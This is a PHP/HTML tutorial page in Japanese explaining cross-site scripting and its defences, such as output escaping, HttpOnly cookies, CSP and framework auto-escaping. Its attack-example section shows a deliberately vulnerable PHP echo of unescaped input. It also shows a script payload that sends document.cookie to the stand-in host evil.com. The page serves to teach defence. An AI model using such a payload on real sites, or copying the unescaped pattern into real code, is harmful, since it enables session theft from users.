<?php
$title = "XSS（クロスサイト・スクリプティング）解説";
require dirname(__DIR__) . "/includes/header.php";
?>
<div class="card mb-4 border-danger">
    <h5 class="card-header bg-danger text-white">XSSとは何か？</h5>
    <div class="card-body p-4">
        <p class="lead">
            ウェブサイトの表示内容に<strong>「悪意のあるスクリプト」を混入させる</strong>攻撃です。
        </p>
        <p>
            ユーザーのブラウザ上でスクリプトが実行されることで、Cookie（セッション情報）の盗み出し、ページ内容の改ざん、偽の入力フォームへの誘導などが行われます。
        </p>
    </div>
</div>

<div class="card mb-4">
    <h5 class="card-header">なぜ脆弱性が生まれるのか？</h5>
    <div class="card-body p-4">
        <p>最大の原因は、<strong>「ユーザーが入力したデータ」をそのままHTMLとして出力してしまう</strong>ことにあります。</p>
        <div class="alert alert-secondary mb-0">
            <p class="mb-1 fw-bold">ブラウザの性質：</p>
            ブラウザは <code>&lt;</code> や <code>&gt;</code> を見つけると、それを「文字」ではなく「HTMLタグ（命令）」として解釈します。対策をしないと、入力データがそのままプログラムとして実行されてしまいます。
        </div>
    </div>
</div>

<div class="card mb-4">
    <h5 class="card-header">攻撃の具体例</h5>
    <div class="card-body p-4">
        <div class="row g-3">
            <div class="col-md-6">
                <div class="card h-100 border-danger">
                    <div class="card-body">
                        <h6 class="text-danger">脆弱なコード例</h6>
                        <pre class="bg-light p-2 rounded small"><code>// ユーザー入力をそのまま出力
&lt;?php
$name = $_GET['name'];
echo "こんにちは、" . $name;
?&gt;</code></pre>
                        <hr class="my-2">
                        <p class="small fw-bold mb-1">攻撃URL：</p>
                        <pre class="bg-light p-2 rounded small"><code>?name=&lt;script&gt;
  fetch('https://evil.com?cookie='
    + document.cookie)
&lt;/script&gt;</code></pre>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card h-100 border-info">
                    <div class="card-body">
                        <h6 class="text-info">何が起きるか</h6>
                        <ul class="small mb-0">
                            <li>ユーザーがこのURLをクリック</li>
                            <li>ページ内でスクリプトが実行される</li>
                            <li>ユーザーのCookieが攻撃者のサーバーへ送信される</li>
                            <li>セッションハイジャック（乗っ取り）が可能に</li>
                        </ul>
                        <hr>
                        <p class="small fw-bold mb-1">その他の被害例：</p>
                        <ul class="small mb-0">
                            <li>偽のログインフォーム表示</li>
                            <li>ページの改ざん</li>
                            <li>キーロガーの埋め込み</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="card mb-4">
    <h5 class="card-header">エスケープ（無害化）の効果</h5>
    <div class="card-body p-4">
        <div class="row g-4">
            <div class="col-md-6">
                <div class="card h-100 border-danger">
                    <div class="card-body">
                        <h6 class="text-danger fw-bold">⚠️ そのまま出力（脆弱）</h6>
                        <p class="small text-muted">入力されたタグをそのまま表示</p>
                        <pre class="bg-light p-3 rounded small"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
                        <hr>
                        <p class="small fw-bold text-danger">ブラウザの挙動：</p>
                        <div class="p-2 border rounded bg-white text-center">
                            <span class="badge bg-danger">JavaScriptとして実行される</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card h-100 border-success">
                    <div class="card-body">
                        <h6 class="text-success fw-bold">✅ エスケープ後（安全）</h6>
                        <p class="small text-muted">記号を特殊な文字列に変換</p>
                        <pre class="bg-light p-3 rounded small"><code>&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</code></pre>
                        <hr>
                        <p class="small fw-bold text-success">ブラウザの挙動：</p>
                        <div class="p-2 border rounded bg-white text-center text-muted">
                            &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
                            <span class="small">(単なる文字列として表示される)</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="alert alert-info mt-4 mb-0">
            <h6>💡 主なエスケープ対象文字</h6>
            <div class="row small">
                <div class="col-6">
                    <code>&lt;</code> → <code>&amp;lt;</code><br>
                    <code>&gt;</code> → <code>&amp;gt;</code><br>
                    <code>&amp;</code> → <code>&amp;amp;</code>
                </div>
                <div class="col-6">
                    <code>"</code> → <code>&amp;quot;</code><br>
                    <code>'</code> → <code>&amp;#039;</code>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="card mb-5 border-success">
    <h5 class="card-header bg-success text-white">正しい対策：多層防御</h5>
    <div class="card-body p-4">
        
        <h6>① 出力時のエスケープ <span class="badge bg-primary">最重要</span></h6>
        <p>
            HTMLとして出力する直前に、必ず特別な意味を持つ記号を無害化します。
        </p>
        <pre class="bg-light p-3 rounded"><code>// PHPの例
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// JavaScriptの例（テキストノード）
element.textContent = userInput;  // 安全

// 危険な例
element.innerHTML = userInput;  // XSSの危険性</code></pre>

        <div class="alert alert-success mt-3">
            <h6 class="text-success">✅ 重要なポイント</h6>
            <ul class="small mb-0">
                <li><strong>出力時</strong>にエスケープ（入力時ではない）</li>
                <li>出力先に応じた適切なエスケープ（HTML、JavaScript、URLなど）</li>
                <li>文字エンコーディングを明示（UTF-8推奨）</li>
            </ul>
        </div>

        <hr>

        <h6>② コンテキストに応じたエスケープ</h6>
        <p>
            出力先によって、適切なエスケープ方法が異なります。
        </p>
        <div class="row g-3">
            <div class="col-md-4">
                <div class="card bg-light">
                    <div class="card-body">
                        <h6 class="small">HTML要素内</h6>
                        <pre class="small mb-0"><code>&lt;div&gt;
  &lt;?= htmlspecialchars($text) ?&gt;
&lt;/div&gt;</code></pre>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card bg-light">
                    <div class="card-body">
                        <h6 class="small">HTML属性内</h6>
                        <pre class="small mb-0"><code>&lt;input value="
  &lt;?= htmlspecialchars($val, ENT_QUOTES) ?&gt;
"&gt;</code></pre>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card bg-light">
                    <div class="card-body">
                        <h6 class="small">JavaScript内</h6>
                        <pre class="small mb-0"><code>&lt;script&gt;
  var x = &lt;?= json_encode($data) ?&gt;;
&lt;/script&gt;</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <hr>

        <h6>③ HttpOnly属性によるCookie保護</h6>
        <p>
            JavaScriptからCookieへのアクセスを禁止し、XSSが成功してもセッションIDを盗ませないようにします。
        </p>
        <pre class="bg-light p-3 rounded"><code>// Cookie設定時
setcookie("session_id", $value, [
    "httponly" => true,  // JavaScriptからアクセス不可
    "secure" => true,    // HTTPS通信のみ
    "samesite" => "Lax"  // CSRF対策も兼ねる
]);</code></pre>

        <hr>

        <h6>④ Content Security Policy (CSP)</h6>
        <p>
            ブラウザに対して「許可するスクリプトの読み込み元」を指示し、インラインスクリプトの実行を制限します。
        </p>
        <pre class="bg-light p-3 rounded"><code>// HTTPヘッダーで設定
header("Content-Security-Policy: default-src 'self'; script-src 'self'");</code></pre>

        <div class="alert alert-info mt-3">
            <h6>💡 CSPの効果</h6>
            <ul class="small mb-0">
                <li>インラインスクリプト（<code>&lt;script&gt;...&lt;/script&gt;</code>）の実行を禁止</li>
                <li>外部スクリプトの読み込み元を制限</li>
                <li>XSSが成功しても被害を最小化</li>
            </ul>
        </div>

        <hr>

        <h6>⑤ フレームワークの機能を正しく使う</h6>
        <p>
            モダンなフレームワークは標準で自動エスケープを行いますが、一部の「危険な機能」を使う際は注意が必要です。
        </p>
        <div class="row g-3">
            <div class="col-md-6">
                <div class="card border-success">
                    <div class="card-body">
                        <h6 class="small text-success">✅ 安全（自動エスケープ）</h6>
                        <pre class="small mb-2"><code>// React
&lt;div&gt;{userInput}&lt;/div&gt;

// Vue
&lt;div&gt;{{ userInput }}&lt;/div&gt;</code></pre>
                        <p class="small mb-0">→ 自動的にエスケープされる</p>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card border-danger">
                    <div class="card-body">
                        <h6 class="small text-danger">⚠️ 危険（エスケープなし）</h6>
                        <pre class="small mb-2"><code>// React
dangerouslySetInnerHTML={{__html: input}}

// Vue
v-html="userInput"</code></pre>
                        <p class="small mb-0">→ 手動でサニタイズ必須</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<?php require dirname(__DIR__) . "/includes/footer.php"; ?>